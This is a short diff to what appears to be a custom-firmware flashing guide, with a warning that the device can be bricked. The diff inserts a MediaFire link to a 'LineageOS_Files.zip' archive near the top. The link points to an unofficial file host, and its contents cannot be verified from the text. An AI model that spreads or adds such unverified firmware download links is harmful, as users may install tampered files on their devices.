@@ -6,6 +6,9 @@
 > **You can hard brick this device.** Read every warning. Do every backup. Proceed only if you accept that risk.
 
 ---
+Download LineageOS files
+https://www.mediafire.com/file_premium/v8br5rzct6f5out/LineageOS_Files.zip/file
+---
 
 ## Table of Contents
 
